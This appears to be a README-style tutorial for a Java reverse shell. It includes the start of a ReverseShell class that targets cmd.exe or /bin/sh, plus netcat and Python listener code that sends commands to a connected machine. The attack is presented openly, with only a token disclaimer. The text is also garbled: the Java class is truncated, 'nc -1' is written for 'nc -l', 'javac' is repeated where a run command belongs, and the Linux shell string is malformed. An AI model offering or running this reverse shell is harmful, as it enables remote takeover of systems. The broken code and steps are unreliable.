{ REVERSE SHELL WITH JAVA }

⚠️DISCLAIMER: Do not use this program on illegal / unauthorized activity, do not use out of context.

‼️requirements: 
    java packages (JDK) 8 or superior.

// WINDOWS {
     
select the ip and the port of the attack: 

      public class ReverseShell {
    public static void main(String[] args) {
        String host = "127.0.0.1"; // IP 
        int port = 5000; // Port
        String command = "cmd.exe";
// SERVER


to run this program in windows open CMD or Powershell and type: 
         javac ReverseShell.java

  download netcat on windows and type:
       nc -1 -p 5000 //or whatever port is

  else use python program:

    import socket

    HOST = '0.0.0.0'  # Ascolta su tutte le interfacce
    PORT = 5000

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"Listening on port {PORT}...")
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = input("Enter command: ")
            if data.lower() == 'exit':
                break
            conn.sendall(data.encode())
            response = conn.recv(4096).decode()
            print(response)

// RUN

after compiling the code type this command:
           javac ReverseShell.java

after this will connect to the port. }

🐧LINUX:{

to run this program on linux change the string:

    String command = "cmd.exe";  
       String command = "/bin/sh/;
type on the terminal this command:

          javac ReverseShell.java

          nc -1 -p 5000 //or whatever port is

  and it will connect }
